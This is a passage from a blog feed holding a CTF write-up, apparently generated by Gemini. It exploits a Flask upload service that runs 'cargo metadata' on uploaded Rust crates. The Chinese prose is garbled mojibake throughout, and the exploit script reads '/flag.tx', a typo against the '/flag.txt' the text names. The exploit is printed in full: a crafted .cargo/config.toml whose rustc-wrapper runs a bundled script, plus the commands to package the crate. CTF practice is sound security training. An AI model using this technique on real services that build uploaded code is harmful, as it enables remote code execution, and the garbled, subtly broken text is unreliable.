class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;version&quot;</span>, <span class="hljs-string">&quot;description&quot;</span>, <span class="hljs-string">&quot;scripts&quot;</span>, <span class="hljs-string">&quot;dependencies&quot;</span>)<br>        <span class="hljs-keyword">if</span> k <span class="hljs-keyword">in</span> pkg<br>    &#125;<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;metadata&quot;</span>: subset&#125;, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_rust_crate</span>(<span class="hljs-params">path: pathlib.Path</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">return</span> (path / <span class="hljs-string">&quot;Cargo.toml&quot;</span>).is_file()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_rust_crate</span>(<span class="hljs-params">extract_dir: pathlib.Path</span>):<br>    stdout, _stderr, code = run(<br>        [<span class="hljs-string">&quot;cargo&quot;</span>, <span class="hljs-string">&quot;metadata&quot;</span>, <span class="hljs-string">&quot;--locked&quot;</span>, <span class="hljs-string">&quot;--offline&quot;</span>, <span class="hljs-string">&quot;--format-version&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>],<br>        cwd=extract_dir,<br>    )<br><br>    <span class="hljs-keyword">if</span> code != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">f&quot;Internal Server Error (exit code: <span class="hljs-subst">&#123;code&#125;</span>)&quot;</span>&#125;, <span class="hljs-number">500</span><br><br>    <span class="hljs-keyword">try</span>:<br>        meta = json.loads(stdout)<br>    <span class="hljs-keyword">except</span> json.JSONDecodeError:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to parse JSON&quot;</span>&#125;, <span class="hljs-number">500</span><br><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;metadata&quot;</span>: meta&#125;, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_image</span>(<span class="hljs-params">file_path: pathlib.Path</span>):<br>    stdout, _stderr, _ = run([<span class="hljs-string">&quot;exiftool&quot;</span>, <span class="hljs-string">&quot;-json&quot;</span>, <span class="hljs-built_in">str</span>(file_path)])<br>    <span class="hljs-keyword">try</span>:<br>        meta = json.loads(stdout <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;null&quot;</span>)<br>    <span class="hljs-keyword">except</span> json.JSONDecodeError:<br>        meta = <span class="hljs-string">&quot;No metadata found&quot;</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;metadata&quot;</span>: meta&#125;, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_media</span>(<span class="hljs-params">file_path: pathlib.Path</span>):<br>    stdout, _stderr, code = run(<br>        [<br>            <span class="hljs-string">&quot;ffprobe&quot;</span>,<br>            <span class="hljs-string">&quot;-v&quot;</span>,<br>            <span class="hljs-string">&quot;quiet&quot;</span>,<br>            <span class="hljs-string">&quot;-print_format&quot;</span>,<br>            <span class="hljs-string">&quot;json&quot;</span>,<br>            <span class="hljs-string">&quot;-show_format&quot;</span>,<br>            <span class="hljs-string">&quot;-show_streams&quot;</span>,<br>            <span class="hljs-built_in">str</span>(file_path),<br>        ]<br>    )<br>    <span class="hljs-keyword">if</span> code != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;ffprobe failed&quot;</span>&#125;, <span class="hljs-number">415</span><br><br>    <span class="hljs-keyword">try</span>:<br>        meta = json.loads(stdout <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;null&quot;</span>)<br>    <span class="hljs-keyword">except</span> json.JSONDecodeError:<br>        meta = &#123;<span class="hljs-string">&quot;raw&quot;</span>: stdout.strip()&#125;<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;metadata&quot;</span>: meta&#125;, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_and_probe</span>(<span class="hljs-params">upload</span>):<br>    workdir = TMP_PARENT / <span class="hljs-built_in">str</span>(uuid.uuid4())<br>    workdir.mkdir(parents=<span class="hljs-literal">True</span>, exist_ok=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        fname = secure_filename(upload.filename) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;upload.bin&quot;</span><br>        raw_path = workdir / fname<br>        raw_path.write_bytes(upload.read())<br><br>        mime = magic.from_file(<span class="hljs-built_in">str</span>(raw_path), mime=<span class="hljs-literal">True</span>)<br><br>        <span class="hljs-keyword">if</span> mime <span class="hljs-keyword">in</span> &#123;<br>            <span class="hljs-string">&quot;application/x-tar&quot;</span>,<br>            <span class="hljs-string">&quot;application/gzip&quot;</span>,<br>            <span class="hljs-string">&quot;application/x-bzip2&quot;</span>,<br>            <span class="hljs-string">&quot;application/zip&quot;</span>,<br>        &#125;:<br>            extract_dir = workdir / <span class="hljs-string">&quot;unpack&quot;</span><br>            extract_dir.mkdir()<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">if</span> mime == <span class="hljs-string">&quot;application/zip&quot;</span>:<br>                    <span class="hljs-keyword">with</span> zipfile.ZipFile(raw_path) <span class="hljs-keyword">as</span> zf:<br>                        zf.extractall(extract_dir)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(raw_path) <span class="hljs-keyword">as</span> tf:<br>                        tf.extractall(extract_dir)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">f&quot;archive extraction failed: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>            <span class="hljs-keyword">if</span> is_node_project(extract_dir):<br>                <span class="hljs-keyword">return</span> handle_node_project(extract_dir)<br><br>            <span class="hljs-keyword">if</span> is_rust_crate(extract_dir):<br>                <span class="hljs-keyword">return</span> handle_rust_crate(extract_dir)<br><br>            listing = <span class="hljs-built_in">sorted</span>(<br>                <span class="hljs-built_in">str</span>(p.relative_to(extract_dir)) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> extract_dir.rglob(<span class="hljs-string">&quot;*&quot;</span>)<br>            )<br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;listing&quot;</span>: listing&#125;, <span class="hljs-number">200</span><br><br>        <span class="hljs-keyword">if</span> mime.startswith(<span class="hljs-string">&quot;image/&quot;</span>):<br>            <span class="hljs-keyword">return</span> handle_image(raw_path)<br><br>        <span class="hljs-keyword">if</span> mime == <span class="hljs-string">&quot;application/pdf&quot;</span>:<br>            <span class="hljs-keyword">return</span> handle_pdf(raw_path)<br><br>        <span class="hljs-keyword">if</span> mime.startswith(<span class="hljs-string">&quot;audio/&quot;</span>) <span class="hljs-keyword">or</span> mime.startswith(<span class="hljs-string">&quot;video/&quot;</span>):<br>            <span class="hljs-keyword">return</span> handle_media(raw_path)<br><br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">f&quot;unsupported MIME: <span class="hljs-subst">&#123;mime&#125;</span>&quot;</span>&#125;, <span class="hljs-number">415</span><br><br>    <span class="hljs-keyword">finally</span>:<br>        shutil.rmtree(workdir, ignore_errors=<span class="hljs-literal">True</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/upload&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;file&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>        abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;multipart/form-data with field &#x27;file&#x27; required&quot;</span>)<br>    result, code = save_and_probe(request.files[<span class="hljs-string">&quot;file&quot;</span>])<br>    <span class="hljs-keyword">return</span> jsonify(result), code<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8000</span>)<br><br></code></pre></td></tr></table></figure><p>ç›´æ¥ä¸¢ç»™ <code>gemini</code> å°±å‡ºäº†ï¼š</p><p>å¥½çš„ï¼Œæˆ‘ä»¬æ¥åˆ†æè¿™é“ CTF é¢˜ç›®çš„ä»£ç å¹¶æ‰¾å‡ºè·å– flag çš„æ–¹æ³•ã€‚</p><p>ç®€è€Œè¨€ä¹‹ï¼Œè¿™æ®µä»£ç çš„æ¼æ´åœ¨äºå¤„ç† Rust Crate å‹ç¼©åŒ…æ—¶ï¼Œå¯ä»¥é€šè¿‡åœ¨å‹ç¼©åŒ…å†…æ„é€ æ¶æ„çš„ <code>.cargo/config.toml</code> æ–‡ä»¶æ¥æŒ‡å®šä¸€ä¸ªåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œçš„è„šæœ¬ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€‚</p><hr><h2 id="ä»£ç åŠŸèƒ½åˆ†æ-Code-Functionality-Analysis"><a href="#ä»£ç åŠŸèƒ½åˆ†æ-Code-Functionality-Analysis" class="headerlink" title="ä»£ç åŠŸèƒ½åˆ†æ (Code Functionality Analysis)"></a>ä»£ç åŠŸèƒ½åˆ†æ (Code Functionality Analysis)</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥æ¢³ç†ä¸€ä¸‹è¿™ä¸ª Flask åº”ç”¨èƒ½å¤„ç†å“ªäº›æ–‡ä»¶ç±»å‹ã€‚æ ¸å¿ƒé€»è¾‘åœ¨ <code>save_and_probe</code> å‡½æ•°ä¸­ï¼Œå®ƒé€šè¿‡ <code>python-magic</code> åº“è¯†åˆ«ä¸Šä¼ æ–‡ä»¶çš„ MIME ç±»å‹ï¼Œç„¶ååˆ†å‘ç»™ä¸åŒçš„å¤„ç†å‡½æ•°ï¼š</p><ol><li><strong>å‹ç¼©æ–‡ä»¶ (Archives)</strong>:<ul><li>MIME ç±»å‹: <code>application/x-tar</code>, <code>application/gzip</code>, <code>application/x-bzip2</code>, <code>application/zip</code></li><li>å¤„ç†æµç¨‹:<ul><li>è§£å‹æ–‡ä»¶åˆ°ä¸€ä¸ªä¸´æ—¶ç›®å½•ã€‚</li><li>æ£€æŸ¥è§£å‹åçš„ç›®å½•æ˜¯å¦ä¸º <strong>Node.js é¡¹ç›®</strong> (åŒ…å« <code>package.json</code>)ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è°ƒç”¨ <code>handle_node_project</code> è§£æå…ƒæ•°æ®ã€‚</li><li>æ£€æŸ¥è§£å‹åçš„ç›®å½•æ˜¯å¦ä¸º <strong>Rust Crate</strong> (åŒ…å« <code>Cargo.toml</code>)ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è°ƒç”¨ <code>handle_rust_crate</code> è§£æå…ƒæ•°æ®ã€‚</li><li>å¦‚æœéƒ½ä¸æ˜¯ï¼Œå°±åˆ—å‡ºå‹ç¼©åŒ…å†…çš„æ‰€æœ‰æ–‡ä»¶åã€‚</li></ul></li></ul></li><li><strong>å›¾ç‰‡æ–‡ä»¶ (Images)</strong>:<ul><li>MIME ç±»å‹: <code>image/*</code></li><li>å¤„ç†æµç¨‹: è°ƒç”¨ <code>handle_image</code> å‡½æ•°ï¼Œä½¿ç”¨ <code>exiftool</code> æå–å›¾ç‰‡çš„ EXIF å…ƒæ•°æ®ã€‚</li></ul></li><li><strong>PDF æ–‡ä»¶</strong>:<ul><li>MIME ç±»å‹: <code>application/pdf</code></li><li>å¤„ç†æµç¨‹: è°ƒç”¨ <code>handle_pdf</code> å‡½æ•°ï¼Œä½¿ç”¨ <code>pdfinfo</code> æå– PDF çš„å…ƒæ•°æ®ã€‚</li></ul></li><li><strong>éŸ³è§†é¢‘æ–‡ä»¶ (Audio&#x2F;Video)</strong>:<ul><li>MIME ç±»å‹: <code>audio/*</code> æˆ– <code>video/*</code></li><li>å¤„ç†æµç¨‹: è°ƒç”¨ <code>handle_media</code> å‡½æ•°ï¼Œä½¿ç”¨ <code>ffprobe</code> æå–åª’ä½“æ–‡ä»¶çš„å…ƒæ•°æ®ã€‚</li></ul></li></ol><p>å¯¹äºä¸æ”¯æŒçš„å…¶ä»–æ–‡ä»¶ç±»å‹ï¼ŒæœåŠ¡å™¨ä¼šè¿”å› <code>415 Unsupported Media Type</code> é”™è¯¯ã€‚</p><hr><h2 id="æ¼æ´å¯»æ‰¾-Vulnerability-Analysis"><a href="#æ¼æ´å¯»æ‰¾-Vulnerability-Analysis" class="headerlink" title="æ¼æ´å¯»æ‰¾ (Vulnerability Analysis)"></a>æ¼æ´å¯»æ‰¾ (Vulnerability Analysis)</h2><p>CTF ä¸­ï¼Œå½“çœ‹åˆ°ç¨‹åºä½¿ç”¨ <code>subprocess.run</code> æˆ–ç±»ä¼¼å‡½æ•°æ¥è°ƒç”¨å¤–éƒ¨å‘½ä»¤è¡Œå·¥å…·æ—¶ï¼Œæˆ‘ä»¬åº”é«˜åº¦è­¦æƒ•å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚æˆ‘ä»¬æ¥é€ä¸€æ’æŸ¥ï¼š</p><ul><li><code>handle_pdf</code>: <code>run([&quot;pdfinfo&quot;, str(file_path)])</code></li><li><code>handle_image</code>: <code>run([&quot;exiftool&quot;, &quot;-json&quot;, str(file_path)])</code></li><li><code>handle_media</code>: <code>run([&quot;ffprobe&quot;, ..., str(file_path)])</code></li></ul><p>åœ¨ä¸Šé¢è¿™ä¸‰ä¸ªè°ƒç”¨ä¸­ï¼Œç”¨æˆ·å¯æ§çš„è¾“å…¥ <code>file_path</code> æ˜¯ä½œä¸ºå‘½ä»¤è¡Œå‚æ•°åˆ—è¡¨ä¸­çš„ä¸€ä¸ªç‹¬ç«‹å…ƒç´ ä¼ é€’çš„ã€‚è¿™æ˜¯ä½¿ç”¨ <code>subprocess</code> çš„å®‰å…¨æ–¹å¼ï¼Œå¯ä»¥æœ‰æ•ˆé˜²æ­¢ç®€å•çš„å‘½ä»¤æ³¨å…¥ï¼ˆæ¯”å¦‚æ–‡ä»¶åå« <code>my_file; ls -la</code>ï¼‰ã€‚è™½ç„¶å¯èƒ½å­˜åœ¨å‚æ•°æ³¨å…¥æ¼æ´ï¼ˆæ¯”å¦‚æ–‡ä»¶åå« <code>-o pwned.txt</code>ï¼‰ï¼Œä½† <code>werkzeug.utils.secure_filename</code> å‡½æ•°ä¼šç§»é™¤æ–‡ä»¶åå‰çš„ <code>-</code>ï¼Œä»è€Œç¼“è§£äº†è¿™ç±»æ”»å‡»ã€‚æ‰€ä»¥è¿™å‡ å¤„çœ‹èµ·æ¥æ˜¯å®‰å…¨çš„ã€‚</p><ul><li><code>handle_rust_crate</code>: <code>run([&quot;cargo&quot;, &quot;metadata&quot;, ...], cwd=extract_dir)</code></li></ul><p>è¿™ä¸ªè°ƒç”¨å°±éå¸¸å¯ç–‘äº†ã€‚å®ƒæ²¡æœ‰å°†ç”¨æˆ·è¾“å…¥ç›´æ¥ä½œä¸ºå‘½ä»¤å‚æ•°ï¼Œè€Œæ˜¯<strong>åœ¨ç”¨æˆ·ä¸Šä¼ å¹¶è§£å‹åçš„ç›®å½• (<code>extract_dir</code>) ä¸­æ‰§è¡Œ <code>cargo metadata</code> å‘½ä»¤</strong>ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å®Œå…¨æ§åˆ¶ <code>cargo</code> å‘½ä»¤æ‰§è¡Œæ—¶çš„ç¯å¢ƒï¼Œç‰¹åˆ«æ˜¯å…¶é…ç½®æ–‡ä»¶ã€‚</p><p>Cargo åœ¨æ‰§è¡Œæ—¶ä¼šè¯»å–é¡¹ç›®ç›®å½•ä¸‹çš„ <code>.cargo/config.toml</code> æ–‡ä»¶ã€‚é€šè¿‡è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ Cargo çš„è¡Œä¸ºã€‚å…¶ä¸­ä¸€ä¸ªæå…¶å±é™©çš„é…ç½®é¡¹æ˜¯ <strong><code>build.rustc-wrapper</code></strong>ã€‚</p><p><strong><code>rustc-wrapper</code></strong>: è¿™ä¸ªé…ç½®é¡¹å…è®¸ä½ æŒ‡å®šä¸€ä¸ªâ€œåŒ…è£…å™¨â€ç¨‹åºã€‚å½“ Cargo éœ€è¦è°ƒç”¨ Rust ç¼–è¯‘å™¨ (<code>rustc</code>) æ—¶ï¼Œå®ƒä¸ä¼šç›´æ¥è¿è¡Œ <code>rustc</code>ï¼Œè€Œæ˜¯ä¼šå»è¿è¡Œä½ æŒ‡å®šçš„é‚£ä¸ªåŒ…è£…å™¨ç¨‹åºï¼Œå¹¶å°† <code>rustc</code> å’Œæ‰€æœ‰ç¼–è¯‘å‚æ•°ä½œä¸ºåŒ…è£…å™¨ç¨‹åºçš„å‚æ•°ã€‚</p><p><code>cargo metadata</code> å‘½ä»¤ä¸ºäº†è·å–é¡¹ç›®çš„å…ƒæ•°æ®ï¼Œéœ€è¦è°ƒç”¨ <code>rustc</code> æ¥åˆ†ææºç ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªåŒ…å«ç‰¹åˆ¶ <code>.cargo/config.toml</code> æ–‡ä»¶çš„ Rust Crate å‹ç¼©åŒ…ï¼Œå°±å¯ä»¥è®©æœåŠ¡å™¨åœ¨è°ƒç”¨ <code>cargo metadata</code> æ—¶æ‰§è¡Œæˆ‘ä»¬æŒ‡å®šçš„ä»»æ„è„šæœ¬ã€‚è¿™å°±æ˜¯æœ¬æ¬¡æŒ‘æˆ˜çš„çªç ´å£ï¼ğŸ”“</p><hr><h2 id="æ¼æ´åˆ©ç”¨æ­¥éª¤-Exploitation-Steps"><a href="#æ¼æ´åˆ©ç”¨æ­¥éª¤-Exploitation-Steps" class="headerlink" title="æ¼æ´åˆ©ç”¨æ­¥éª¤ (Exploitation Steps)"></a>æ¼æ´åˆ©ç”¨æ­¥éª¤ (Exploitation Steps)</h2><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ Rust Crate å‹ç¼©åŒ…ã€‚å½“æœåŠ¡å™¨è§£å‹å¹¶å¯¹å…¶è¿è¡Œ <code>cargo metadata</code> æ—¶ï¼Œä¼šæ‰§è¡Œæˆ‘ä»¬é¢„è®¾çš„å‘½ä»¤æ¥è¯»å– flagã€‚</p><p>å‡è®¾ flag æ–‡ä»¶ä½äº <code>/flag.txt</code>ã€‚</p><h3 id="1-åˆ›å»ºæ¶æ„-Rust-é¡¹ç›®ç»“æ„"><a href="#1-åˆ›å»ºæ¶æ„-Rust-é¡¹ç›®ç»“æ„" class="headerlink" title="1. åˆ›å»ºæ¶æ„ Rust é¡¹ç›®ç»“æ„"></a>1. åˆ›å»ºæ¶æ„ Rust é¡¹ç›®ç»“æ„</h3><p>é¦–å…ˆï¼Œåœ¨ä½ çš„æœ¬åœ°æœºå™¨ä¸Šåˆ›å»ºå¦‚ä¸‹çš„æ–‡ä»¶å’Œç›®å½•ç»“æ„ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">exploit-crate/<br>â”œâ”€â”€ .cargo/<br>â”‚   â””â”€â”€ config<span class="hljs-selector-class">.toml</span><br>â”œâ”€â”€ <span class="hljs-attribute">src</span>/<br>â”‚   â””â”€â”€ lib<span class="hljs-selector-class">.rs</span><br>â”œâ”€â”€ get_flag<span class="hljs-selector-class">.sh</span><br>â””â”€â”€ Cargo.toml`<br></code></pre></td></tr></table></figure><h3 id="2-ç¼–å†™å„ä¸ªæ–‡ä»¶å†…å®¹"><a href="#2-ç¼–å†™å„ä¸ªæ–‡ä»¶å†…å®¹" class="headerlink" title="2. ç¼–å†™å„ä¸ªæ–‡ä»¶å†…å®¹"></a>2. ç¼–å†™å„ä¸ªæ–‡ä»¶å†…å®¹</h3><p><strong>a. <code>Cargo.toml</code> (é¡¹ç›®æè¿°æ–‡ä»¶)</strong></p><p>è¿™ä¸ªæ–‡ä»¶åªéœ€è¦ç¬¦åˆåŸºæœ¬æ ¼å¼å³å¯ï¼Œå†…å®¹ä¸é‡è¦ã€‚</p><p>Ini, TOML</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[package]<br>name = <span class="hljs-string">&quot;exploit&quot;</span><br>version = <span class="hljs-string">&quot;0.1.0&quot;</span><br>edition = <span class="hljs-string">&quot;2021&quot;</span>`<br></code></pre></td></tr></table></figure><p><strong>b. <code>src/lib.rs</code> (æºç æ–‡ä»¶)</strong></p><p>è¿™ä¸ªæ–‡ä»¶åŒæ ·åªéœ€è¦å­˜åœ¨å³å¯ï¼Œå†…å®¹ä¸ºç©ºéƒ½è¡Œã€‚</p><p>Rust</p><p><strong>c. <code>get_flag.sh</code> (æˆ‘ä»¬çš„æ¶æ„è„šæœ¬)</strong></p><p>è¿™æ˜¯æˆ‘ä»¬æƒ³åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œçš„è„šæœ¬ã€‚å®ƒä¼šè¯»å– flag æ–‡ä»¶ï¼Œå¹¶å°†å†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚Cargo ä¼šæ•è·è¿™ä¸ªè¾“å‡ºï¼Œè™½ç„¶æˆ‘ä»¬å¯èƒ½åœ¨æœ€ç»ˆçš„ JSON å“åº”ä¸­çœ‹ä¸åˆ°å®ƒï¼Œä½†å‘½ä»¤ç¡®å®æ‰§è¡Œäº†ã€‚æ›´ç¨³å¦¥çš„åŠæ³•æ˜¯å°† flag å‘é€åˆ°æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼ˆåå‘ shell æˆ– webhookï¼‰ã€‚è¿™é‡Œä¸ºäº†ç®€å•æ¼”ç¤ºï¼Œæˆ‘ä»¬å‡è®¾ flag ä¼šè¢«åŒ…å«åœ¨ <code>cargo</code> çš„é”™è¯¯è¾“å‡ºä¸­è¿”å›ã€‚</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">cat</span> /flag.tx<br></code></pre></td></tr></table></figure><p><strong>é‡è¦</strong>: åˆ›å»ºå®Œè„šæœ¬åï¼Œä¸€å®šè¦ç»™å®ƒæ·»åŠ å¯æ‰§è¡Œæƒé™ï¼</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x exploit-crate/get_flag.sh<br></code></pre></td></tr></table></figure><p><strong>d. <code>.cargo/config.toml</code> (æ ¸å¿ƒé…ç½®æ–‡ä»¶)</strong></p><p>è¿™æ˜¯æ•´ä¸ªæ”»å‡»çš„æ ¸å¿ƒã€‚æˆ‘ä»¬åœ¨è¿™é‡ŒæŒ‡å®š <code>get_flag.sh</code> ä½œä¸º <code>rustc-wrapper</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[build]<br><span class="hljs-comment"># We use a relative path here. When cargo runs, it will be in the &#x27;exploit-crate&#x27; directory.</span><br>rustc-wrapper = <span class="hljs-string">&quot;./get_flag.sh&quot;</span><br></code></pre></td></tr></table></figure><h3 id="3-æ‰“åŒ…å¹¶ä¸Šä¼ "><a href="#3-æ‰“åŒ…å¹¶ä¸Šä¼ " class="headerlink" title="3. æ‰“åŒ…å¹¶ä¸Šä¼ "></a>3. æ‰“åŒ…å¹¶ä¸Šä¼ </h3><p>ç°åœ¨ï¼Œå°†æ•´ä¸ª <code>exploit-crate</code> ç›®å½•å‹ç¼©æˆä¸€ä¸ª <code>.zip</code> æˆ– <code>.tar.gz</code> æ–‡ä»¶ã€‚</p><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># åˆ›å»º .tar.gz å‹ç¼©åŒ…</span><br>tar -czvf exploit.tar.gz exploit-crate/<br><br><span class="hljs-comment"># æˆ–è€…åˆ›å»º .zip å‹ç¼©åŒ…</span><br>zip -r exploit.zip exploit-crate/<br></code></pre></td></tr></table></figure><p>æœ€åï¼Œå°†ç”Ÿæˆçš„ <code>exploit.tar.gz</code> æˆ– <code>exploit.zip</code> æ–‡ä»¶ä¸Šä¼ åˆ°é¢˜ç›®çš„ç½‘é¡µä¸Šã€‚</p><h3 id="4-è·å–-Flag"><a href="#4-è·å–-Flag" class="headerlink" title="4. è·å– Flag"></a>4. è·å– Flag</h3><p>å½“æœåŠ¡å™¨æ”¶åˆ°æ–‡ä»¶åï¼š</p><ol><li>å®ƒä¼šæ£€æµ‹åˆ°è¿™æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…å¹¶è§£å‹ã€‚</li><li>å®ƒä¼šå‘ç°è§£å‹åçš„ç›®å½•åŒ…å« <code>Cargo.toml</code>ï¼Œäºæ˜¯è°ƒç”¨ <code>handle_rust_crate</code>ã€‚</li><li><code>handle_rust_crate</code> åœ¨è§£å‹ç›®å½•ä¸­æ‰§è¡Œ <code>cargo metadata</code>ã€‚</li><li>Cargo è¯»å– <code>.cargo/config.toml</code> æ–‡ä»¶ï¼Œå‘ç°è®¾ç½®äº† <code>rustc-wrapper</code>ã€‚</li><li>å½“ Cargo å°è¯•è°ƒç”¨ <code>rustc</code> æ—¶ï¼Œå®ƒå®é™…ä¸Šä¼šæ‰§è¡Œ <code>./get_flag.sh</code>ã€‚</li><li><code>./get_flag.sh</code> è„šæœ¬æ‰§è¡Œ <code>cat /flag.txt</code>ã€‚</li><li><code>cargo metadata</code> å‘½ä»¤å¯èƒ½ä¼šå› ä¸º wrapper çš„å¼‚å¸¸è¾“å‡ºè€Œå¤±è´¥å¹¶é€€å‡ºï¼Œä½†æˆ‘ä»¬çš„è„šæœ¬å·²ç»æˆåŠŸæ‰§è¡Œäº†ã€‚æœåŠ¡å™¨å¯èƒ½ä¼šè¿”å›ä¸€ä¸ª 500 é”™è¯¯ï¼Œä½†åœ¨é”™è¯¯ä¿¡æ¯ä¸­ï¼Œå¯èƒ½ä¼šåŒ…å« <code>cargo</code> çš„æ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œå…¶ä¸­å°±å¯èƒ½åŒ…å«äº† flag çš„å†…å®¹ã€‚</li></ol><p>é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œä½ å°±å¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤å¹¶æ‹¿åˆ° flag äº†ã€‚ğŸš©</p><p>æœ¬æ¬¡ <code>CTF</code> æ¯”èµ›å®Œæˆçš„ç›¸å…³å†…å®¹å°±å¦‚ä¸Šäº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>pwn</tag>
      
      <tag>rust</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MIT_OS_Chp1</title>
    <link href="/2025/09/11/MIT-OS-Chp1/"/>
    <url>/2025/09/11/MIT-OS-Chp1/</url>
    
